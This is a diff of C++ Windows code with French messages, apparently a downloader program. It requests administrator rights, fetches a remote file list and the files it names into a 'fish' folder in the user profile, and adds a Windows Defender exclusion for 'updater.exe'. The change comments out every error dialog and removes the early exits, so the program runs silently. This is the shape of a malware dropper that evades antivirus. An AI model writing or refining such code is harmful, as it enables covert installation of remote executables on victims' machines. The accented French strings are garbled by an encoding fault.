@@ -80,14 +80,13 @@ void downloadFile(const string& url, const string& localPath) {
     URLDownloadToFile(NULL, url.c_str(), localPath.c_str(), 0, NULL);
 }
 
-int run_main() {
+void run_main() {
 
     RequestAdminPrivileges();
     
     string userFolder = GetUserFolderPath();
     if (userFolder.empty()) {
-        MessageBox(NULL, "Impossible d'obtenir le dossier utilisateur.", "Erreur", MB_OK | MB_ICONERROR);
-        return 1;
+        // MessageBox(NULL, "Impossible d'obtenir le dossier utilisateur.", "Erreur", MB_OK | MB_ICONERROR);
     }
 
     string fishFolder = userFolder + "\\fish";
@@ -98,8 +97,7 @@ int run_main() {
 
     string fileListPath = fishFolder + "\\" + FILE_LIST;
     if (!DownloadFile(SERVER_URL + FILE_LIST, fileListPath)) {
-        MessageBox(NULL, "�chec du t�l�chargement de files.txt", "Erreur", MB_OK | MB_ICONERROR);
-        return 1;
+        //MessageBox(NULL, "�chec du t�l�chargement de files.txt", "Erreur", MB_OK | MB_ICONERROR);
     }
 
     vector<string> filesToDownload = GetFileList(fileListPath);
@@ -114,7 +112,6 @@ int run_main() {
         if (!DownloadFile(url, localPath)) {
             //cout << "�chec du t�l�chargement de : " << url << endl;
             //MessageBox(NULL, ("�chec du t�l�chargement de " + file).c_str(), "Erreur", MB_OK | MB_ICONERROR);
-            return 1;
         }
 
         //cout << "T�l�chargement r�ussi de : " << url << " vers " << localPath << endl;
@@ -141,6 +138,4 @@ int run_main() {
 
     string updaterPath = fishFolder + "\\updater.exe";
     AddDefenderExclusion(updaterPath);
-
-    return 0;
 }
